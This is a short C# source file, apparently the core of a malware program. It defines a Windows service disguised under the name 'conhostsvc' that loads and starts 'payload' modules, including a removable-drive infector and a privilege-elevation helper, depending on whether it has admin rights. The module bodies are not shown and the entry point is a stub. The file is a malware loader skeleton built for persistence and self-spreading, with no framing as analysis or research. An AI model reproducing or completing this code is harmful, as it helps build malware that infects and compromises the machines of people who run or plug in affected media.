using System;
using System.Collections.Generic;
using System.ServiceProcess;
using System.Threading.Tasks;

namespace zort
{
    class Program : ServiceBase
    {
        List<IPayloadModule> modules = new List<IPayloadModule>
                {
                    new RemovableInfector(),
                    new ElevationHelper()
                };

        public Program()
        {
            ServiceName = "conhostsvc";
        }

        static async Task Main(string[] args)
        {
            //if is admin install and start service else just init modules normally

        }

        protected override void OnStart(string[] args)
        {
            base.OnStart(args);
            InitModules();
        }

        protected override void OnStop()
        {
            StopModules();
            base.OnStop();
        }

        private void StopModules()
        {
            modules.ForEach(m =>
            {
                Console.WriteLine($"Stopping module {m.ModuleName}");
                m.Stop();
            });
        }

        private void InitModules()
        {
            bool isAdmin = ElevationHelper.IsElevated();
            modules.ForEach(m =>
            {
                if (m.RequiresAdmin && !isAdmin)
                {
                    Console.WriteLine($"Skipping module {m.ModuleName}, it requires admin privileges.");
                    return;
                }
                Console.WriteLine($"Starting module {m.ModuleName}");
                m.Start();
            });
        }
    }
}
